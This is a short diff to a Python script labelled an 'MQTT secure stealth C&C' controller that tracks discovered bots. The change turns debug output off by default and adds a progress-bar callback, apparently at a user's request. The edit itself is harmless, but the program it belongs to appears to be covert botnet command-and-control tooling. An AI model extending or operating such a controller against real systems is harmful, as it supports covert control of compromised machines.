@@ -17,7 +17,7 @@ SALT = "S4ur0ns_S3cr3t_S4lt_2025"
 SEND_INTERVAL = 1.0
 ID_SCAN_TIME = 2.0  # Seconds to scan for existing IDs
 USE_STEALTH_MODE = os.environ.get("USE_STEALTH_MODE", "True").lower() == "true"
-DEBUG = os.environ.get("DEBUG", "True").lower() == "true"
+DEBUG = os.environ.get("DEBUG", "False").lower() == "true"
 
 # Track discovered bots
 discovered_bots = set()
@@ -144,8 +144,34 @@ if __name__ == "__main__":
     
     mode_str = "STEALTH" if USE_STEALTH_MODE else "FINGERPRINT"
     
+    import sys
+
+    def progress_handler(msg_id, seq, total, direction):
+        """Render progress bar."""
+        # Only show for multi-chunk or if preferred, but user asked for "even non debug mode".
+        # But for 1/1 chunks, it might flicker fast.
+        # Let's show for all.
+        
+        # Determine bar width
+        bar_len = 20
+        filled_len = int(round(bar_len * seq / float(total)))
+        percents = round(100.0 * seq / float(total), 1)
+        bar = '=' * filled_len + '-' * (bar_len - filled_len)
+        
+        # Message ID short
+        mid = f"{msg_id:08x}"
+        
+        # Overwrite line
+        sys.stdout.write(f"\r[{direction}] {mid} [{bar}] {percents}% ({seq}/{total})")
+        sys.stdout.flush()
+        
+        if seq == total:
+             sys.stdout.write("\n") # New line on completion
+             sys.stdout.flush()
+
     # Register message handler
     stack.on_receive(handle_message)
+    stack.set_progress_callback(progress_handler)
     
     print("--- MQTT SECURE STEALTH C&C ---")
     print(f"Controller ID: {CONTROLLER_ID} (sending every {SEND_INTERVAL}s)")
